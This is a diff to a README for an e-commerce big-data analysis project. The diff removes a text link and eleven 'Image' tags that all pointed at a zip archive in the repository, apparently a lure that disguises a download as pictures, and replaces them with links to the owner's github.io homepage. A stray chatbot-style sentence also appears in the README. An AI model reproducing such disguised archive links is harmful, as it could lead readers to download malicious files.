@@ -14,18 +14,18 @@
 
 - **High-Value Users Matter**: The top 10 users each spent over **$2,100**, highlighting the impact of power shoppers on overall revenue.
 
-Let me know if you want to include this summary in your `https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip`.
+Let me know if you want to include this summary in your `https://pranavsiripangi.github.io`.
  ## Technologies Used- Apache Spark 3.4.0- PySpark- Python (Pandas, Matplotlib, Seaborn)- Google Cola
 
 
-<img width="1101" height="461" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="1527" height="291" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="1403" height="681" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="1337" height="383" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="709" height="800" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="942" height="796" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="1065" height="697" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="1350" height="393" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="1166" height="907" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="947" height="748" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
-<img width="740" height="607" alt="Image" src="https://github.com/Pranavsiripangi/E-commerce-Big-Data-Analysis-Project/raw/refs/heads/main/protract/Data_Big_Project_commerce_Analysis_2.9.zip" />
+<img width="1101" height="461" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="1527" height="291" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="1403" height="681" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="1337" height="383" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="709" height="800" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="942" height="796" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="1065" height="697" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="1350" height="393" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="1166" height="907" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="947" height="748" alt="Image" src="https://pranavsiripangi.github.io" />
+<img width="740" height="607" alt="Image" src="https://pranavsiripangi.github.io" />
